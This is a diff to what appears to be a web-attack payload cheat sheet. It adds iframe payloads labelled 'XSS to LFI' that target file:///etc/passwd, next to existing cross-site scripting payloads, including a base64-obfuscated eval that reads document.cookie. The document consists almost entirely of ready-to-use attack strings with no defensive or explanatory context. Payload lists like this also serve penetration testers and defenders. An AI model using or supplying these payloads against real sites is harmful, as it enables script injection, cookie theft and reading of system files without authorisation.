@@ -19,6 +19,11 @@ Basic XSS:
 	 <img src=x onerror=confirm(document.domain)>
 	 <svg onload=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
 
+XSS to LFI
+|_'<IFRAME SRC="file:///etc/passwd" height=100 width=100>'
+  '"><IFRAME SRC="file:///etc/passwd" height=100 width=100>'
+   <IFRAME SRC="file:///etc/passwd" height=100 width=100>
+
 DOM:
  |_ <img src=x onerror="alert(Object.keys(window))">
     <script>alert(document.documentElement.innerHTML.substring(0,500))</script>
